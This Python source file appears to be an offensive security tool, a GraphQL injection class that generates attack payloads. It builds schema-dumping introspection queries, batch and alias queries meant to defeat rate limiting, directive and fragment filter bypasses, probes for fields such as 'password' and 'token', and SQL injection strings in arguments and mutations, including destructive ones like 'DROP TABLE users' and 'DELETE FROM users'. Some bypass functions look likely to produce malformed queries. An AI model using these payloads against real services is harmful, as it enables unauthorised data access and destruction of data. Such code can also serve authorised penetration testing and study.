#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
GenSQL GraphQL Injector - GraphQL injection attack vectors
Author: Jeevraj
Supports: Introspection bypass, batch queries, alias bypass, fragment injection
"""

import json
import re

class GraphQLInjector(object):
    """GraphQL injection and enumeration."""

    def __init__(self, do_introspect=False, verbose=False):
        self.do_introspect = do_introspect
        self.verbose = verbose
        self.schema = None
        self.types = {}

    def generate_introspection_query(self):
        """
        Generate GraphQL introspection query to dump schema.
        
        Returns:
            GraphQL introspection query string
        """
        return '''{
          __schema {
            types {
              name
              kind
              description
              fields {
                name
                type {
                  name
                  kind
                }
              }
              possibleTypes {
                name
              }
            }
            queryType { name }
            mutationType { name }
            subscriptionType { name }
          }
        }'''

    def generate_batch_query(self, queries):
        """
        Generate batch query to exploit lack of query batching protection.
        
        Args:
            queries: List of GraphQL query strings
        
        Returns:
            Batch query payload
        """
        batch = []
        for i, query in enumerate(queries):
            batch.append({"query": query})
        return json.dumps(batch)

    def generate_alias_bypass(self, query):
        """
        Generate query with aliases to bypass rate limiting.
        
        Args:
            query: Original GraphQL query
        
        Returns:
            Query with aliases
        """
        # Example: { user { id } } becomes { a: user { id } b: user { id } c: user { id } }
        aliases = []
        base_query = re.search(r'\{\s*([^}]+)\s*\}', query)
        
        if base_query:
            inner = base_query.group(1).strip()
            for i, letter in enumerate('abcdefghijklmnop'):
                aliases.append(f"{letter}: {inner}")
            return "{ " + " ".join(aliases) + " }"
        
        return query

    def generate_fragment_injection(self, query):
        """
        Inject fragments to bypass parsing filters.
        
        Args:
            query: Original query
        
        Returns:
            Query with fragment injection
        """
        fragments = '''fragment fields on Query {
          __typename
          ... @skip(if: false) {
            __typename
          }
        }'''
        return query + " " + fragments

    def generate_sql_injection_in_field(self, field_name):
        """
        Generate GraphQL query with SQL injection in field argument.
        
        Args:
            field_name: GraphQL field name
        
        Returns:
            Injected query
        """
        payloads = [
            f'''{{
              {field_name}(id: "1' OR '1'='1") {{
                id
                name
              }}
            }}''',
            f'''{{
              {field_name}(search: "1' UNION SELECT * FROM users -- ") {{
                results {{
                  id
                  name
                }}
              }}
            }}''',
            f'''{{
              {field_name}(id: "1; DROP TABLE users; --") {{
                id
              }}
            }}''',
        ]
        return payloads

    def generate_field_suggestions(self, known_fields=None):
        """
        Generate query to discover field names via suggestions.
        
        Args:
            known_fields: List of known field names
        
        Returns:
            Discovery query
        """
        if not known_fields:
            known_fields = ['user', 'users', 'admin', 'secret', 'password', 'token', 'key']
        
        # Try to access each field
        attempts = []
        for field in known_fields:
            attempts.append(f"{field}: {field} {{ id }}")
        
        return "{ " + " ".join(attempts) + " }"

    def inject_directive_bypass(self, query):
        """
        Bypass query filtering with directives.
        
        Args:
            query: Original query
        
        Returns:
            Query with bypass directives
        """
        # Use @skip and @include directives
        bypasses = [
            query.replace(" ", " @skip(if: false) "),
            query.replace(" ", " @include(if: true) "),
            query.replace("{", "{ ... @skip(if: false)"),
        ]
        return bypasses

    def parse_introspection_response(self, response_text):
        """
        Parse introspection response and extract schema.
        
        Args:
            response_text: Introspection response JSON
        
        Returns:
            Dict of extracted schema
        """
        try:
            data = json.loads(response_text)
            if 'data' in data and '__schema' in data['data']:
                schema = data['data']['__schema']
                types_list = {}
                
                for type_obj in schema.get('types', []):
                    type_name = type_obj.get('name')
                    fields = []
                    
                    for field in type_obj.get('fields', []):
                        fields.append(field.get('name'))
                    
                    types_list[type_name] = fields
                
                self.schema = schema
                self.types = types_list
                
                if self.verbose:
                    print(f"[+] GraphQL schema extracted: {len(types_list)} types found")
                
                return types_list
        except Exception as e:
            if self.verbose:
                print(f"[!] Failed to parse introspection: {str(e)[:60]}")
        
        return {}

    def generate_mutation_payloads(self, mutation_name):
        """
        Generate GraphQL mutation payloads.
        
        Args:
            mutation_name: Mutation to attack
        
        Returns:
            List of mutation payloads
        """
        payloads = [
            f'''mutation {{
              {mutation_name}(input: {{id: "1' OR '1'='1"}}) {{
                success
              }}
            }}''',
            f'''mutation {{
              {mutation_name}(input: {{input: "1; DELETE FROM users; --"}}) {{
                result
              }}
            }}''',
        ]
        return payloads
